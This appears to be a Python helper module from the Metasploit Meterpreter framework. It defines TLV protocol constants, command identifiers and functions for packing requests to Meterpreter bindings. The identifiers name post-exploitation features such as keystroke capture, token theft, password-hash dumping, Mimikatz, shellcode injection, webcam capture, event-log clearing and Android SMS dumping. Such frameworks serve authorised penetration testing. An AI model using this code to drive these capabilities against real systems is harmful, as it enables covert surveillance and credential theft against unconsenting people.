import sys, struct, random, string, meterpreter_bindings

# A stack of this stuff was stolen from the Python Meterpreter. We should look
# to find a nice way of sharing this across the two without the duplication.
#
# START OF COPY PASTE

#
# Constants
#

# these values will be patched, DO NOT CHANGE THEM
DEBUGGING = False
HTTP_CONNECTION_URL = None
HTTP_PROXY = None
HTTP_USER_AGENT = None
PAYLOAD_UUID = ''
SESSION_COMMUNICATION_TIMEOUT = 300
SESSION_EXPIRATION_TIMEOUT = 604800
SESSION_RETRY_TOTAL = 3600
SESSION_RETRY_WAIT = 10

PACKET_TYPE_REQUEST        = 0
PACKET_TYPE_RESPONSE       = 1
PACKET_TYPE_PLAIN_REQUEST  = 10
PACKET_TYPE_PLAIN_RESPONSE = 11

ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1
ERROR_FAILURE_PYTHON = 2
ERROR_FAILURE_WINDOWS = 3

CHANNEL_CLASS_BUFFERED = 0
CHANNEL_CLASS_STREAM   = 1
CHANNEL_CLASS_DATAGRAM = 2
CHANNEL_CLASS_POOL     = 3

#
# TLV Meta Types
#
TLV_META_TYPE_NONE       = (   0   )
TLV_META_TYPE_STRING     = (1 << 16)
TLV_META_TYPE_UINT       = (1 << 17)
TLV_META_TYPE_RAW        = (1 << 18)
TLV_META_TYPE_BOOL       = (1 << 19)
TLV_META_TYPE_QWORD      = (1 << 20)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP      = (1 << 30)
TLV_META_TYPE_COMPLEX    = (1 << 31)
# not defined in original
TLV_META_TYPE_MASK = (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)

#
# TLV base starting points
#
TLV_RESERVED   = 0
TLV_EXTENSIONS = 20000
TLV_USER       = 40000
TLV_TEMP       = 60000

#
# TLV Specific Types
#
TLV_TYPE_ANY                   = TLV_META_TYPE_NONE    | 0
TLV_TYPE_METHOD                = TLV_META_TYPE_STRING  | 1
TLV_TYPE_REQUEST_ID            = TLV_META_TYPE_STRING  | 2
TLV_TYPE_EXCEPTION             = TLV_META_TYPE_GROUP   | 3
TLV_TYPE_RESULT                = TLV_META_TYPE_UINT    | 4
TLV_TYPE_METHOD_ID             = TLV_META_TYPE_UINT    | 5

TLV_TYPE_STRING                = TLV_META_TYPE_STRING  | 10
TLV_TYPE_UINT                  = TLV_META_TYPE_UINT    | 11
TLV_TYPE_BOOL                  = TLV_META_TYPE_BOOL    | 12

TLV_TYPE_LENGTH                = TLV_META_TYPE_UINT    | 25
TLV_TYPE_DATA                  = TLV_META_TYPE_RAW     | 26
TLV_TYPE_FLAGS                 = TLV_META_TYPE_UINT    | 27

TLV_TYPE_CHANNEL_ID            = TLV_META_TYPE_UINT    | 50
TLV_TYPE_CHANNEL_TYPE          = TLV_META_TYPE_STRING  | 51
TLV_TYPE_CHANNEL_DATA          = TLV_META_TYPE_RAW     | 52
TLV_TYPE_CHANNEL_DATA_GROUP    = TLV_META_TYPE_GROUP   | 53
TLV_TYPE_CHANNEL_CLASS         = TLV_META_TYPE_UINT    | 54
TLV_TYPE_CHANNEL_PARENTID      = TLV_META_TYPE_UINT    | 55

TLV_TYPE_SEEK_WHENCE           = TLV_META_TYPE_UINT    | 70
TLV_TYPE_SEEK_OFFSET           = TLV_META_TYPE_UINT    | 71
TLV_TYPE_SEEK_POS              = TLV_META_TYPE_UINT    | 72

TLV_TYPE_EXCEPTION_CODE        = TLV_META_TYPE_UINT    | 300
TLV_TYPE_EXCEPTION_STRING      = TLV_META_TYPE_STRING  | 301

TLV_TYPE_LIBRARY_PATH          = TLV_META_TYPE_STRING  | 400
TLV_TYPE_TARGET_PATH           = TLV_META_TYPE_STRING  | 401

TLV_TYPE_TRANS_TYPE            = TLV_META_TYPE_UINT    | 430
TLV_TYPE_TRANS_URL             = TLV_META_TYPE_STRING  | 431
TLV_TYPE_TRANS_UA              = TLV_META_TYPE_STRING  | 432
TLV_TYPE_TRANS_COMM_TIMEOUT    = TLV_META_TYPE_UINT    | 433
TLV_TYPE_TRANS_SESSION_EXP     = TLV_META_TYPE_UINT    | 434
TLV_TYPE_TRANS_CERT_HASH       = TLV_META_TYPE_RAW     | 435
TLV_TYPE_TRANS_PROXY_HOST      = TLV_META_TYPE_STRING  | 436
TLV_TYPE_TRANS_PROXY_USER      = TLV_META_TYPE_STRING  | 437
TLV_TYPE_TRANS_PROXY_PASS      = TLV_META_TYPE_STRING  | 438
TLV_TYPE_TRANS_RETRY_TOTAL     = TLV_META_TYPE_UINT    | 439
TLV_TYPE_TRANS_RETRY_WAIT      = TLV_META_TYPE_UINT    | 440
TLV_TYPE_TRANS_HEADERS         = TLV_META_TYPE_STRING  | 441
TLV_TYPE_TRANS_GROUP           = TLV_META_TYPE_GROUP   | 442

TLV_TYPE_MACHINE_ID            = TLV_META_TYPE_STRING  | 460
TLV_TYPE_UUID                  = TLV_META_TYPE_RAW     | 461
TLV_TYPE_SESSION_GUID          = TLV_META_TYPE_RAW     | 462

TLV_TYPE_PEER_HOST             = TLV_META_TYPE_STRING  | 1500
TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503

#
# Method Identifiers
#
CORE_CHANNEL_CLOSE = 1000
CORE_CHANNEL_EOF = 1001
CORE_CHANNEL_INTERACT = 1002
CORE_CHANNEL_OPEN = 1003
CORE_CHANNEL_READ = 1004
CORE_CHANNEL_SEEK = 1005
CORE_CHANNEL_TELL = 1006
CORE_CHANNEL_WRITE = 1007
CORE_CONSOLE_WRITE = 1008
CORE_ENUMEXTCMD = 1009
CORE_GET_SESSION_GUID = 1010
CORE_LOADLIB = 1011
CORE_MACHINE_ID = 1012
CORE_MIGRATE = 1013
CORE_NATIVE_ARCH = 1014
CORE_NEGOTIATE_TLV_ENCRYPTION = 1015
CORE_PATCH_URL = 1016
CORE_PIVOT_ADD = 1017
CORE_PIVOT_REMOVE = 1018
CORE_PIVOT_SESSION_DIED = 1019
CORE_PIVOT_SESSION_NEW = 1020
CORE_SET_SESSION_GUID = 1021
CORE_SET_UUID = 1022
CORE_SHUTDOWN = 1023
CORE_TRANSPORT_ADD = 1024
CORE_TRANSPORT_CHANGE = 1025
CORE_TRANSPORT_GETCERTHASH = 1026
CORE_TRANSPORT_LIST = 1027
CORE_TRANSPORT_NEXT = 1028
CORE_TRANSPORT_PREV = 1029
CORE_TRANSPORT_REMOVE = 1030
CORE_TRANSPORT_SET_TIMEOUTS = 1031
CORE_TRANSPORT_SETCERTHASH = 1032
CORE_TRANSPORT_SLEEP = 1033
CORE_METHOD_MAX = CORE_TRANSPORT_SLEEP
STDAPI_AUDIO_MIC_LIST = 2000
STDAPI_AUDIO_MIC_START = 2001
STDAPI_AUDIO_MIC_STOP = 2002
STDAPI_FS_CHDIR = 2003
STDAPI_FS_CHMOD = 2004
STDAPI_FS_DELETE_DIR = 2005
STDAPI_FS_DELETE_FILE = 2006
STDAPI_FS_FILE_COPY = 2007
STDAPI_FS_FILE_EXPAND_PATH = 2008
STDAPI_FS_FILE_MOVE = 2009
STDAPI_FS_GETWD = 2010
STDAPI_FS_LS = 2011
STDAPI_FS_MD5 = 2012
STDAPI_FS_MKDIR = 2013
STDAPI_FS_MOUNT_SHOW = 2014
STDAPI_FS_SEARCH = 2015
STDAPI_FS_SEPARATOR = 2016
STDAPI_FS_SHA1 = 2017
STDAPI_FS_STAT = 2018
STDAPI_NET_CONFIG_ADD_ROUTE = 2019
STDAPI_NET_CONFIG_GET_ARP_TABLE = 2020
STDAPI_NET_CONFIG_GET_INTERFACES = 2021
STDAPI_NET_CONFIG_GET_NETSTAT = 2022
STDAPI_NET_CONFIG_GET_PROXY = 2023
STDAPI_NET_CONFIG_GET_ROUTES = 2024
STDAPI_NET_CONFIG_REMOVE_ROUTE = 2025
STDAPI_NET_RESOLVE_HOST = 2026
STDAPI_NET_RESOLVE_HOSTS = 2027
STDAPI_NET_SOCKET_TCP_SHUTDOWN = 2028
STDAPI_RAILGUN_API = 2029
STDAPI_RAILGUN_API_MULTI = 2030
STDAPI_RAILGUN_MEMREAD = 2031
STDAPI_RAILGUN_MEMWRITE = 2032
STDAPI_REGISTRY_CHECK_KEY_EXISTS = 2033
STDAPI_REGISTRY_CLOSE_KEY = 2034
STDAPI_REGISTRY_CREATE_KEY = 2035
STDAPI_REGISTRY_DELETE_KEY = 2036
STDAPI_REGISTRY_DELETE_VALUE = 2037
STDAPI_REGISTRY_ENUM_KEY = 2038
STDAPI_REGISTRY_ENUM_KEY_DIRECT = 2039
STDAPI_REGISTRY_ENUM_VALUE = 2040
STDAPI_REGISTRY_ENUM_VALUE_DIRECT = 2041
STDAPI_REGISTRY_LOAD_KEY = 2042
STDAPI_REGISTRY_OPEN_KEY = 2043
STDAPI_REGISTRY_OPEN_REMOTE_KEY = 2044
STDAPI_REGISTRY_QUERY_CLASS = 2045
STDAPI_REGISTRY_QUERY_VALUE = 2046
STDAPI_REGISTRY_QUERY_VALUE_DIRECT = 2047
STDAPI_REGISTRY_SET_VALUE = 2048
STDAPI_REGISTRY_SET_VALUE_DIRECT = 2049
STDAPI_REGISTRY_UNLOAD_KEY = 2050
STDAPI_SYS_CONFIG_DRIVER_LIST = 2051
STDAPI_SYS_CONFIG_DROP_TOKEN = 2052
STDAPI_SYS_CONFIG_GETENV = 2053
STDAPI_SYS_CONFIG_GETPRIVS = 2054
STDAPI_SYS_CONFIG_GETSID = 2055
STDAPI_SYS_CONFIG_GETUID = 2056
STDAPI_SYS_CONFIG_LOCALTIME = 2057
STDAPI_SYS_CONFIG_REV2SELF = 2058
STDAPI_SYS_CONFIG_STEAL_TOKEN = 2059
STDAPI_SYS_CONFIG_SYSINFO = 2060
STDAPI_SYS_EVENTLOG_CLEAR = 2061
STDAPI_SYS_EVENTLOG_CLOSE = 2062
STDAPI_SYS_EVENTLOG_NUMRECORDS = 2063
STDAPI_SYS_EVENTLOG_OLDEST = 2064
STDAPI_SYS_EVENTLOG_OPEN = 2065
STDAPI_SYS_EVENTLOG_READ = 2066
STDAPI_SYS_POWER_EXITWINDOWS = 2067
STDAPI_SYS_PROCESS_ATTACH = 2068
STDAPI_SYS_PROCESS_CLOSE = 2069
STDAPI_SYS_PROCESS_EXECUTE = 2070
STDAPI_SYS_PROCESS_GET_INFO = 2071
STDAPI_SYS_PROCESS_GET_PROCESSES = 2072
STDAPI_SYS_PROCESS_GETPID = 2073
STDAPI_SYS_PROCESS_IMAGE_GET_IMAGES = 2074
STDAPI_SYS_PROCESS_IMAGE_GET_PROC_ADDRESS = 2075
STDAPI_SYS_PROCESS_IMAGE_LOAD = 2076
STDAPI_SYS_PROCESS_IMAGE_UNLOAD = 2077
STDAPI_SYS_PROCESS_KILL = 2078
STDAPI_SYS_PROCESS_MEMORY_ALLOCATE = 2079
STDAPI_SYS_PROCESS_MEMORY_FREE = 2080
STDAPI_SYS_PROCESS_MEMORY_LOCK = 2081
STDAPI_SYS_PROCESS_MEMORY_PROTECT = 2082
STDAPI_SYS_PROCESS_MEMORY_QUERY = 2083
STDAPI_SYS_PROCESS_MEMORY_READ = 2084
STDAPI_SYS_PROCESS_MEMORY_UNLOCK = 2085
STDAPI_SYS_PROCESS_MEMORY_WRITE = 2086
STDAPI_SYS_PROCESS_THREAD_CLOSE = 2087
STDAPI_SYS_PROCESS_THREAD_CREATE = 2088
STDAPI_SYS_PROCESS_THREAD_GET_THREADS = 2089
STDAPI_SYS_PROCESS_THREAD_OPEN = 2090
STDAPI_SYS_PROCESS_THREAD_QUERY_REGS = 2091
STDAPI_SYS_PROCESS_THREAD_RESUME = 2092
STDAPI_SYS_PROCESS_THREAD_SET_REGS = 2093
STDAPI_SYS_PROCESS_THREAD_SUSPEND = 2094
STDAPI_SYS_PROCESS_THREAD_TERMINATE = 2095
STDAPI_SYS_PROCESS_WAIT = 2096
STDAPI_TCP_CHANNEL_OPEN = 2097
STDAPI_UI_DESKTOP_ENUM = 2098
STDAPI_UI_DESKTOP_GET = 2099
STDAPI_UI_DESKTOP_SCREENSHOT = 2100
STDAPI_UI_DESKTOP_SET = 2101
STDAPI_UI_ENABLE_KEYBOARD = 2102
STDAPI_UI_ENABLE_MOUSE = 2103
STDAPI_UI_GET_IDLE_TIME = 2104
STDAPI_UI_GET_KEYS = 2105
STDAPI_UI_GET_KEYS_UTF8 = 2106
STDAPI_UI_SEND_KEYS = 2107
STDAPI_UI_SEND_MOUSE = 2108
STDAPI_UI_START_KEYSCAN = 2109
STDAPI_UI_STOP_KEYSCAN = 2110
STDAPI_UI_UNLOCK_DESKTOP = 2111
STDAPI_WEBCAM_AUDIO_RECORD = 2112
STDAPI_WEBCAM_GET_FRAME = 2113
STDAPI_WEBCAM_LIST = 2114
STDAPI_WEBCAM_START = 2115
STDAPI_WEBCAM_STOP = 2116
PRIV_ELEVATE_GETSYSTEM = 3000
PRIV_FS_BLANK_DIRECTORY_MACE = 3001
PRIV_FS_BLANK_FILE_MACE = 3002
PRIV_FS_GET_FILE_MACE = 3003
PRIV_FS_SET_FILE_MACE = 3004
PRIV_FS_SET_FILE_MACE_FROM_FILE = 3005
PRIV_PASSWD_GET_SAM_HASHES = 3006
EXTAPI_ADSI_DOMAIN_QUERY = 4000
EXTAPI_CLIPBOARD_GET_DATA = 4001
EXTAPI_CLIPBOARD_MONITOR_DUMP = 4002
EXTAPI_CLIPBOARD_MONITOR_PAUSE = 4003
EXTAPI_CLIPBOARD_MONITOR_PURGE = 4004
EXTAPI_CLIPBOARD_MONITOR_RESUME = 4005
EXTAPI_CLIPBOARD_MONITOR_START = 4006
EXTAPI_CLIPBOARD_MONITOR_STOP = 4007
EXTAPI_CLIPBOARD_SET_DATA = 4008
EXTAPI_NTDS_PARSE = 4009
EXTAPI_PAGEANT_SEND_QUERY = 4010
EXTAPI_SERVICE_CONTROL = 4011
EXTAPI_SERVICE_ENUM = 4012
EXTAPI_SERVICE_QUERY = 4013
EXTAPI_WINDOW_ENUM = 4014
EXTAPI_WMI_QUERY = 4015
INCOGNITO_ADD_GROUP_USER = 5000
INCOGNITO_ADD_LOCALGROUP_USER = 5001
INCOGNITO_ADD_USER = 5002
INCOGNITO_IMPERSONATE_TOKEN = 5003
INCOGNITO_LIST_TOKENS = 5004
INCOGNITO_SNARF_HASHES = 5005
KIWI_EXEC_CMD = 6000
ANDROID_ACTIVITY_START = 7000
ANDROID_CHECK_ROOT = 7001
ANDROID_DEVICE_SHUTDOWN = 7002
ANDROID_DUMP_CALLLOG = 7003
ANDROID_DUMP_CONTACTS = 7004
ANDROID_DUMP_SMS = 7005
ANDROID_GEOLOCATE = 7006
ANDROID_HIDE_APP_ICON = 7007
ANDROID_INTERVAL_COLLECT = 7008
ANDROID_SEND_SMS = 7009
ANDROID_SET_AUDIO_MODE = 7010
ANDROID_SET_WALLPAPER = 7011
ANDROID_SQLITE_QUERY = 7012
ANDROID_WAKELOCK = 7013
ANDROID_WLAN_GEOLOCATE = 7014
APPAPI_APP_INSTALL = 8000
APPAPI_APP_LIST = 8001
APPAPI_APP_RUN = 8002
APPAPI_APP_UNINSTALL = 8003
DUMP_RAM = 9000
ESPIA_AUDIO_GET_DEV_AUDIO = 10000
ESPIA_IMAGE_GET_DEV_SCREEN = 10001
ESPIA_VIDEO_GET_DEV_IMAGE = 10002
LANATTACKS_ADD_TFTP_FILE = 11000
LANATTACKS_DHCP_LOG = 11001
LANATTACKS_RESET_DHCP = 11002
LANATTACKS_RESET_TFTP = 11003
LANATTACKS_SET_DHCP_OPTION = 11004
LANATTACKS_START_DHCP = 11005
LANATTACKS_START_TFTP = 11006
LANATTACKS_STOP_DHCP = 11007
LANATTACKS_STOP_TFTP = 11008
MIMIKATZ_CUSTOM_COMMAND = 12000
NETWORKPUG_START = 13000
NETWORKPUG_STOP = 13001
PEINJECTOR_INJECT_SHELLCODE = 14000
POWERSHELL_ASSEMBLY_LOAD = 15000
POWERSHELL_EXECUTE = 15001
POWERSHELL_SESSION_REMOVE = 15002
POWERSHELL_SHELL = 15003
PYTHON_EXECUTE = 16000
PYTHON_RESET = 16001
SNIFFER_CAPTURE_DUMP = 17000
SNIFFER_CAPTURE_DUMP_READ = 17001
SNIFFER_CAPTURE_RELEASE = 17002
SNIFFER_CAPTURE_START = 17003
SNIFFER_CAPTURE_STATS = 17004
SNIFFER_CAPTURE_STOP = 17005
SNIFFER_INTERFACES = 17006
UNHOOK_PE = 18000

NULL_BYTE = '\x00'

is_str = lambda obj: issubclass(obj.__class__, str)
is_bytes = lambda obj: issubclass(obj.__class__, str)
bytes = lambda *args: str(*args[:1])
unicode = lambda x: (x.decode('UTF-8') if isinstance(x, str) else x)

def tlv_pack(*args):
  if len(args) == 2:
    tlv = {'type':args[0], 'value':args[1]}
  else:
    tlv = args[0]
  data = ''
  value = tlv['value']
  if (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
    if isinstance(value, float):
      value = int(round(value))
    data = struct.pack('>III', 12, tlv['type'], value)
  elif (tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
    data = struct.pack('>IIQ', 16, tlv['type'], value)
  elif (tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
    data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(value))), 'UTF-8')
  else:
    if value.__class__.__name__ == 'unicode':
      value = value.encode('UTF-8')
    elif not is_bytes(value):
      value = bytes(value, 'UTF-8')
    if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
      data = struct.pack('>II', 8 + len(value) + 1, tlv['type']) + value + NULL_BYTE
    elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
      data = struct.pack('>II', 8 + len(value), tlv['type']) + value
    elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
      data = struct.pack('>II', 8 + len(value), tlv['type']) + value
    elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
      data = struct.pack('>II', 8 + len(value), tlv['type']) + value
  return data

def packet_enum_tlvs(pkt, tlv_type = None):
  offset = 0
  while (offset < len(pkt)):
    tlv = struct.unpack('>II', pkt[offset:offset+8])
    if (tlv_type == None) or ((tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type):
      val = pkt[offset+8:(offset+8+(tlv[0] - 8))]
      if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
        val = str(val.split(NULL_BYTE, 1)[0])
      elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
        val = struct.unpack('>I', val)[0]
      elif (tlv[1] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
        val = struct.unpack('>Q', val)[0]
      elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
        val = bool(struct.unpack('b', val)[0])
      elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
        pass
      yield {'type':tlv[1], 'length':tlv[0], 'value':val}
    offset += tlv[0]
  raise StopIteration()

def packet_get_tlv(pkt, tlv_type):
  try:
    tlv = list(packet_enum_tlvs(pkt, tlv_type))[0]
  except IndexError:
    return {}
  return tlv

def packet_get_tlv_default(pkt, tlv_type, default):
  try:
    tlv = list(packet_enum_tlvs(pkt, tlv_type))[0]
  except IndexError:
    return {'value': default}
  return tlv

# END OF COPY PASTE

def validate_binding(required):
  """Makes sure that the current set of bindings that is available
  in Meterpreter's bindings list contains that required by the caller.
  This function returns the correct binding name to call."""

  # assume all core commands are valid
  if required <= CORE_METHOD_MAX:
    required = 'meterpreter_core'
  else:
    required = 'binding_{0}'.format(required)

  if not required in set(dir(meterpreter_bindings)):
    raise Exception('Missing bindings: {0}'.format(required))

  return required

def invoke_meterpreter(method_id, is_local, tlv = ""):
  binding = validate_binding(method_id)

  header = struct.pack('>I', PACKET_TYPE_REQUEST)
  header += tlv_pack(TLV_TYPE_METHOD_ID, method_id)
  header += tlv_pack(TLV_TYPE_REQUEST_ID, 0)
  # add a leading 4-byte "zero" for the xor-key, 16 byte null guid, 4 byte encryption flag
  req = '\x00' * 24
  req += struct.pack('>I', len(header) + len(tlv) + 4)
  req += header + tlv

  return getattr(meterpreter_bindings, binding)(is_local, req)

def rnd_string(n):
  return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(n))

